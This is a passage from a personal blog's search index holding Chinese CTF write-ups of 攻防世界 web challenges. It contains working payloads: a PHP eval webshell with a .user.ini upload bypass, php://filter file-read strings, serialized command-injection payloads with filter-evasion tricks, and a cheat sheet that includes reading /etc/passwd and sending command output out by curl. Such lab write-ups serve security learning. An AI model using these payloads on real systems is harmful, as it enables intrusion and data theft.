class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);   <span class="hljs-comment">//对a进行序列化操作</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$c</span>);  <span class="hljs-comment">//通过添加+号绕过正则的过滤</span><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$c</span>);   <span class="hljs-comment">//利用__wakeup()的CVE-2016-7124  在序列化的字符串当中当真实的属性个数大于真实的属性个数时  该函数不会执行</span><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;%00&#x27;</span>,<span class="hljs-variable">$c</span>);   <span class="hljs-comment">//序列化私有类时  类名和字段名前会有空格  使用url传参时需要将空格替换成%00</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$j</span>=(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$c</span>));  <span class="hljs-comment">//对其进行base64编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$j</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Demo&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;Demofile&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;fl4g.php&quot;</span>;&#125;<br><span class="hljs-attribute">O</span>:+<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Demo&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;Demofile&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;fl4g.php&quot;</span>;&#125;<br><span class="hljs-attribute">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span>==<br></code></pre></td></tr></table></figure><p>传参即可</p><hr>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2023/03/30/%E5%89%8D%E8%A8%80/"/>
    <url>/2023/03/30/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>为了这个博客，我花了一个星期TAT，<del>真来之不易</del>， 从零开始，通过搭网站debug又学到了一些东西，后面会记录一些<del>大佬学习笔记</del></p><p>​                              To                                                      Be                                          Continue</p>]]></content>
    
    
    <categories>
      
      <category>pre</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/03/26/web01/"/>
    <url>/2023/03/26/web01/</url>
    
    <content type="html"><![CDATA[<h2 id="先记一个学校CTF赛题"><a href="#先记一个学校CTF赛题" class="headerlink" title="先记一个学校CTF赛题"></a>先记一个学校CTF赛题</h2><h3 id="管理员错误使用了vim使得异常退出"><a href="#管理员错误使用了vim使得异常退出" class="headerlink" title="管理员错误使用了vim使得异常退出"></a>管理员错误使用了vim使得异常退出</h3><p><img src="vim%E5%BC%82%E5%B8%B8%E9%80%80%E5%87%BA.png" alt="vim异常退出"></p><p>根据vim的缓存原理，访问.index.php.swp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url：http://47.92.27.98:21655/.index.php.swp<br></code></pre></td></tr></table></figure><p><img src="index.php.swp.png" alt="index.php.swp"></p><p>访问url，下载缓存文件，记事本打开，ctrl+f “flag”  get~</p><hr><h3 id="再记一个忘了哪做的题了"><a href="#再记一个忘了哪做的题了" class="headerlink" title="再记一个忘了哪做的题了"></a>再记一个忘了哪做的题了</h3><p>代码审计：md5加密相同但本身不同，想到数组绕过，尝试flag.php发现页面空白，查看源码得到flag</p><p><img src="%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87.png" alt="数组绕过"></p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-你知道index-php的备份文件名吗？"><a href="#1-你知道index-php的备份文件名吗？" class="headerlink" title="1.你知道index.php的备份文件名吗？"></a>1.你知道index.php的备份文件名吗？</h3><p>直接在url后加index.php.bak，下载备份文件，记事本打开</p><p>index.php.bak(backup备份)</p><hr><h3 id="2-一个不能按的按钮"><a href="#2-一个不能按的按钮" class="headerlink" title="2.一个不能按的按钮"></a>2.一个不能按的按钮</h3><p>F12看网页源码，发现button被禁用了，把disabled删掉</p><p><img src="button.png" alt="button"></p><hr><h3 id="3-sql-get"><a href="#3-sql-get" class="headerlink" title="3.sql(get)"></a>3.sql(get)</h3><p>明显的get注入，burp intruder模块1-10000爆破，得到2333，访问</p><p><img src="sql.png" alt="sql"></p><hr><h3 id="4-robots协议"><a href="#4-robots协议" class="headerlink" title="4.robots协议"></a>4.robots协议</h3><p>直接在url上访问robots.txt</p><p><img src="robots1.png" alt="robots1"></p><p>发现&#x2F;fl0g.php是不被允许的，直接访问</p><p><img src="robots2.png" alt="robots2"></p><hr><h3 id="5-PHP2"><a href="#5-PHP2" class="headerlink" title="5.PHP2"></a>5.PHP2</h3><p>进去显示你能认证这个网站吗，直接御剑扫后台，发现&#x2F;index.phps</p><p><img src="php2.1.png" alt="php2"></p><p>分析PHP代码，发现函数对传参进行了url解码，那我们需要对admin进行编码，由于浏览器本身会解码一次，所以我们编码两次，用burp编码模块，GET传参得到flag</p><p><img src="php2.2.png" alt="php2.2"></p><hr><h3 id="6-PHP"><a href="#6-PHP" class="headerlink" title="6.PHP"></a>6.PHP</h3><p>a和b都是get传参，a&#x3D;&#x3D;0是弱类型比较，值一样即可，无需类型相同，所以a随便传一个字符串如a&#x3D;’0’，a&#x3D;’0a’，flag1就得到了；b&gt;1234，但b不能是数字或者数字字符串，所以输b&#x3D;12345b，当’12345b’与 1234比较时，字符串先转换成数值12345， 再和1234比较12345&gt;1234，为真，输出flag2</p><p><img src="%E8%BF%98%E6%98%AFPHP.png" alt="还是PHP"></p><hr><h3 id="7-想想初始页面"><a href="#7-想想初始页面" class="headerlink" title="7.想想初始页面"></a>7.想想初始页面</h3><p>想到index.php，访问，F12查看一波</p><p><img src="index1.png" alt="index"></p><p>发现302跳转到location：1.php，说明index是存在的，burp重放模块</p><p><img src="index2.png" alt="index2"></p><p>说flag被隐藏了，但flag就藏在包里第五行<del>差点没看见&#x3D; &#x3D;</del></p><hr><h3 id="8-easyupload"><a href="#8-easyupload" class="headerlink" title="8.easyupload"></a>8.easyupload</h3><p>文件上传，php被拦，上传图片马，依然被拦，说明“php”很可能被检测出来，所以这里用短标签绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传成功但无法解析，想到分布式配置文件.htaccess，被拦，上传.user.ini以解析php，内容为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>Burp抓包，把Content-Type改成image&#x2F;jpg，绕过检测</p><p>然后上传图片马4.jpg，F12查看图片去向，蚁剑连接，打开flag文件。</p><p><img src="easyupload.png" alt="easyupload"></p><h4 id="关于-user-ini"><a href="#关于-user-ini" class="headerlink" title="关于.user.ini"></a>关于.user.ini</h4><p>.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini</p><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如4.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;4.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p><p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p><hr><h3 id="9-fileinclude"><a href="#9-fileinclude" class="headerlink" title="9.fileinclude"></a>9.fileinclude</h3><p>进入靶场，老规矩F12看一哈,发现有代码被注释了，格式不好看，所以查看页面源代码：</p><p><img src="fileinclude1.png" alt="fileinclude1"></p><p>关键在于15行，lan是存放着name为language的cookie的值的变量，当lan非零时将包含$lan.php，那任务就明确了，传一个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: language=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br></code></pre></td></tr></table></figure><p>得到base64编码的一串字符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHA<span class="hljs-symbol">NCiRmbGFnPSJjeWJlcnBlYWNlezU1</span><span class="hljs-symbol">NmNlYWExYWJmZWZmNzg0</span>Mjc<span class="hljs-number">2</span>Mz<span class="hljs-name">g5</span>ODRk<span class="hljs-symbol">NDUxOTMxfSI7</span>DQo/Pg==<br></code></pre></td></tr></table></figure><p>decode</p><p><img src="fileinclude2.png" alt="fileinclude2"></p><p>关于base64加密的原因，就是利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。（感谢‘zhangyuhaimian’——一个大黑阔）</p><h4 id="关于php-x2F-x2F-filter"><a href="#关于php-x2F-x2F-filter" class="headerlink" title="关于php:&#x2F;&#x2F;filter"></a>关于php:&#x2F;&#x2F;filter</h4><p>文章中还介绍了用base64解码绕过<?php exit; ?></p><p><a href="https://blog.csdn.net/weixin_44576725/article/details/124177555">php:&#x2F;&#x2F;filter的妙用</a></p><hr><h3 id="10-fileclude"><a href="#10-fileclude" class="headerlink" title="10.fileclude"></a>10.fileclude</h3><p>又是查看源代码</p><p><img src="fileclude1.png" alt="fileclude1"></p><p>发现有flag.php，如果file2的文件内容为hello ctf，则包含file1，那任务就明确了，把flag.php的内容base64加密写到file1里，然后往file2写入hello ctf</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></code></pre></td></tr></table></figure><p>然后burp抓包，post方式写入hello ctf</p><p><img src="fileclude2.png" alt="fileclude2"></p><p>再解密就行了。</p><p><a href="https://blog.csdn.net/weixin_44508748/article/details/108162951?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&utm_relevant_index=4">漏洞梳理篇之php伪协议</a></p><hr><h3 id="11-file-include"><a href="#11-file-include" class="headerlink" title="11.file_include"></a>11.file_include</h3><p>经过前两道题的<del>沉淀</del>，我自认为我可以拿捏这道题了，我直接输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=check.php</span><br></code></pre></td></tr></table></figure><p>结果却是这样的：</p><p><img src="file_include1.png" alt="file_include1"></p><p>不得不说，<del>这个结果伤害了我</del>。</p><p>这里面应该有东西被过滤了，我在网上找到了别的绕过方法</p><p>使用其他的过滤器convert.iconv.* 绕过</p><p> 使用方法：convert.iconv.<input-encoding>.<output-encoding> 或者 convert.iconv.<input-encoding>&#x2F;<output-encoding></output-encoding></input-encoding></output-encoding></input-encoding></p><p>这里的<input-encoding>和<output-encoding>分别为输入的字符串编码方式和输出的字符串编码方式（字符集）。由于不知道哪种能成功，这里可以用burp爆破</output-encoding></input-encoding></p><p>这里直接给出能用的两个字符集UTF-8和UCS-2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=check.php</span><br></code></pre></td></tr></table></figure><p>页面多了一行代码，给出了过滤情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])<br>&#123; <br><span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>; <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>))<br>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>);    <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>盲猜flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><img src="file_include2.png" alt="file_include2"></p><hr><h3 id="12-unseping"><a href="#12-unseping" class="headerlink" title="12.unseping"></a>12.unseping</h3><p>贴脸开大，还是读代码</p><p><img src="unseping1.png" alt="unseping1"></p><p>这个是反序列化，但是这个题没用上wakeup()，主要是命令执行，但是代码中可以看到，args是一个数组，数组中的ls等等命令都被拦了，那就绕过，这里采用反斜杠‘\’绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>&#125;<br>  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://c.runoob.com/compile/1/">PHP在线编译工具</a></p><p>输出：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</p><p><img src="unseping2.png" alt="unseping2"></p><p>看到：array(2) {  [0]&#x3D;&gt;  string(12) “flag_1s_here”  [1]&#x3D;&gt;  string(9) “index.php” }</p><p>在这有个问题，为啥array(‘dir’)和lsarray(‘l\s’)不同：</p><p>array(1) {  [0]&#x3D;&gt;  string(23) “flag_1s_here  index.php” }</p><p>但无论如何我们看到了flag_1s_here</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s$&#123;IFS&#125;fl\ag_1s_here&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重复的地方不再赘述，这里的重点是绕过空格及flag关键字的过滤，依然采用\绕过，空格用${IFS}绕过</p><p>得到：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyMjoibFxzJHtJRlN9ZmxcYWdfMXNfaGVyZSI7fX0&#x3D;</p><p>POST提交：</p><p><img src="unseping3.png" alt="unseping3"></p><p>有个php文件，但是；和&amp;和&#x2F;都被拦了，没法绕，换个方法，把字符变成八进制，看了一下别人写的，唯一一个疑点就是为啥是’\%o’。我试了一下，加一个\是没效果的，具体为啥我没深究，两个\就行了，附上C语言脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/* code */</span><br>    <span class="hljs-type">char</span> site[] = <span class="hljs-string">&quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span> site / <span class="hljs-keyword">sizeof</span> site[<span class="hljs-number">0</span>]; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\%o&quot;</span>,site[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://www.nhooo.com/tool/c/">C语言在线编译</a></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">143\141\164\40</span>\<span class="hljs-number">146\154\141\147</span>\<span class="hljs-number">137\61\163\137</span>\<span class="hljs-number">150\145\162\145</span>\<span class="hljs-number">57\146\154\141</span>\<span class="hljs-number">147\137\70\63</span>\<span class="hljs-number">61\142\66\71</span>\<span class="hljs-number">60\61\62\143</span>\<span class="hljs-number">66\67\142\63</span>\<span class="hljs-number">65\146\56\160</span>\<span class="hljs-number">150\160</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="unseping4.png" alt="unseping4"></p><p>还不是很明白为啥cat了还要$(printf)</p><p>命令执行绕过</p><p>1.正则校验时如过滤cat|flag|ls，在字符串中插入空的环境变量绕过如’l${Z}s’,并用 $${IFS}代替空格<br>2.过滤绕过：分隔符编码（url、base64）绕过<br>3.八进制绕过：如ls: l对应assic码108 108-&gt;八进制:154: $(printf “\154\163”)&#x2F;&#x2F;ls<br>4.十六进制绕过：echo “字符串转16进制的结果” | xxd -r -p|bash &#x2F;&#x2F;xxd:十六进制输出<br>5.linux内置分隔符：${IFS}$9、${IFS}、$IFS$9<br>6.使用重定向符： cat&lt;&gt;flag.php<br>7.$PS2:&gt; $PS4:+<br>8.关键词拆分命令绕过：a&#x3D;l;b&#x3D;s;ab<br>9.控制环境变量绕过: echo $PATH得到&#x2F;user&#x2F;local… 要哪个字符截取哪个字符<br>echo ${PATH:1:1} -&gt;u echo ${PATH:0:4} -&gt;&#x2F;usr<br>10.空值绕过：cat fl””ag cat fl’’ag cat “fl””ag”<br>11.反斜杠绕过：ca\t flag l\s<br>12.空变量：x代表1-9如ca${7}t a.txt-&gt;cat a.txt，在没有传入参数的情况下，这些特殊字符默认为空<br>wh$1oami wh${1}oami<br>who$@ami who${@}ami<br>whoa$<em>mi whoa${</em>}mi<br>13.花括号：在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}<br>{cat,flag.php}<br>{cat,&#x2F;etc&#x2F;passwd}<br>{whoami,}<br>14.无回显的命令执行：可以通过curl命令将命令的结果输出到访问的url中<br>curl <a href="http://www.com/%E5%8F%8D%E5%BC%95%E5%8F%B7whoami%E5%8F%8D%E5%BC%95%E5%8F%B7">www.com/反引号whoami反引号</a><br>15.其他读文件命令<br>bash tac nl more less head tail vi cat bzmore bzless paste sort</p><p><a href>原文链接</a><a href="https://blog.csdn.net/qq_53385700/article/details/128741076">https://blog.csdn.net/qq_53385700/article/details/128741076</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
